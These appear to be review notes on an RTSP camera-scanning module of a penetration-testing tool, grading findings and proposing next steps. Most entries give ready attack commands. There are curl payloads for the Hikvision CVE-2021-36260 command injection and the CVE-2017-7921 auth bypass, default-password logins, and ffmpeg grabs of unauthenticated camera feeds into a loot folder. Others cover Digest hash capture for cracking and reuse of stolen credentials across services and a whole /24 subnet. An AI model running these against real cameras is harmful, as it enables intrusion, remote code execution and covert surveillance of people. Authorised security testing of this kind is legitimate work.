summary: RTSP module is one of the strongest in this tranche — OPTIONS/DESCRIBE fingerprint + SDP disclosure + well-known vendor path enum + rtsp_unauth_stream (T2 world-viewable) + default_cred_check (T3 12 vendor defaults with Digest auth). The RTSP-over-HTTP tunnel probe is defined but its finding kind (rtsp_http_tunnel) has a NARRATIVE entry but no findings() emitter — dead code. rtsp_creds_in_url pulls text-derived creds but never validates them against the target. digest_capture leaves a hashcat placeholder that no downstream module consumes.

findings.title_pattern: RTSP server discloses vendor/model via OPTIONS
findings.tier_evidence: Server header + Public verb list are pure fingerprint.
findings.promotion_notes: Cross-reference Server against CVE table (already done via cve_hits) — the actual promotion is rtsp_known_vuln, so this stays fingerprint.

findings.tier_evidence: Confirms a live RTSP responder; no vuln.
findings.promotion_notes: Covered by other findings for depth.

findings.title_pattern: RTSP Digest realm / Basic scheme discloses camera identity
findings.tier_evidence: Realm string is a fingerprint; Basic-alongside-Digest is a config observation.
findings.promotion_notes: When Basic offered, wire tcpdump helper (already recommended in cmd) to catch a live client Authorization: Basic <b64> = T2 credential capture. Currently just advises.

findings.tier_evidence: The captured challenge is server-side only; the emitted $sip$ shape has literal '<nc>*<cnonce>*...*<response>' placeholders — not crackable without a client capture.
findings.promotion_notes: During default_cred_check recce already computes a real client response — capture THAT into a hashcat-shape line for offline crack, not just the server portion. Also promote to sniff+MitM helper.
findings.tester_next_step: Wait for a live client capture; feed captured (realm,nonce,nc,cnonce,uri,method,response) into hashcat -m 11400 wordlist.

findings.tier_evidence: DESCRIBE returned 200 + SDP with codecs/media/tool parsed — the module has proven the stream serves without auth. Attacker only needs ffplay to consume.
findings.promotion_notes: Trigger a bounded ffmpeg 5-second grab as evidence artifact (jpg snapshot). Save to loot/. Also apply to co-located ONVIF (554→onvif on 80/8080) — same cameras usually leave ONVIF anonymous.
findings.tester_next_step: ffmpeg -rtsp_transport tcp -i rtsp://<ip>:<port>/ -t 5 -c copy loot/rtsp_<ip>.mkv; ffmpeg -i loot/rtsp_<ip>.mkv -vframes 1 loot/rtsp_<ip>.jpg.

findings.tier_evidence: SDP body actually returned to unauth DESCRIBE (401 or 200 elsewhere) — real disclosure of tracks/codecs.
findings.promotion_notes: Extract control URIs from a=control and issue SETUP+PLAY to prove that one track actually streams RTP anonymously.
findings.tester_next_step: ffprobe -rtsp_transport tcp rtsp://<ip>:<port>/; then ffplay -rtsp_transport tcp rtsp://<ip>:<port>/<control-uri-from-sdp>.

findings.tier_evidence: Real 200/401 responses to per-vendor paths — deterministic vendor fingerprint + stream URL disclosure.
findings.promotion_notes: Any 200 hit already promotes via unauth_stream. Any 401 hit should feed default_cred_check with THAT path (currently only root '/' is tested), materially raising the T3 hit rate.
findings.tester_next_step: For each 401-answering path try camera defaults: openRTSP -u admin -p 12345 rtsp://<ip>:<port><path>

findings.title_pattern: IP camera fingerprint matches known-vulnerable build (CVE-XXXX-XXXX)
findings.tier_evidence: Server-header regex match only; no version check, no PoC executed. The CVE label rides on a substring like 'Hikvision' without firmware version confirmation.
findings.promotion_notes: For CVE-2021-36260 (Hikvision) send the PoC PUT /SDK/webLanguage with the ${IFS} command injection payload as `id > /tmp/x` and read back — deterministic T2 RCE proof (still gated as active/opt-in). For CVE-2017-7921 issue GET /Security/users?auth=YWRtaW46MTEK to confirm auth bypass.
findings.tester_next_step: curl -k -X PUT 'http://<ip>/SDK/webLanguage' -d '<?xml version="1.0" encoding="UTF-8"?><language>$(id)</language>' — confirms CVE-2021-36260; curl 'http://<ip>/Security/users?auth=YWRtaW46MTEK' — confirms CVE-2017-7921.

findings.promotion_notes: CN often IS the MAC/serial — feed into known_devices as high-signal identifier.

findings.tier_evidence: DESCRIBE authenticated (200 OK) with a specific user/pass — actual credentialed session established.
findings.promotion_notes: Push the cred into known_credentials so the co-located HTTP admin UI, ONVIF (80/8080/onvif), Telnet (23), and vendor UDP config (37777 Dahua, 9010 Hikvision-SDK) auto-retry it. Chain into cred_quickconnect for one-click ffmpeg dump.
findings.tester_next_step: openRTSP -u <user> -p <pass> rtsp://<ip>:<port>/; curl -u <user>:<pass> http://<ip>/ISAPI/System/deviceInfo (Hikvision) or http://<ip>/cgi-bin/magicBox.cgi?action=getSystemInfo (Dahua) to test admin-UI reuse; feed into ONVIF probe.

findings.tier_evidence: Cleartext user/pass extracted from previously-collected text; not validated but reusable.
findings.promotion_notes: Push text-derived creds into default_cred_check pairs for the target host + into known_credentials for global reuse. Validate the pair with a DESCRIBE first, then flag as T3.
findings.tester_next_step: openRTSP -u <user> -p <pass> rtsp://<host>:<port><path>; then retry same pair against every camera on the /24.
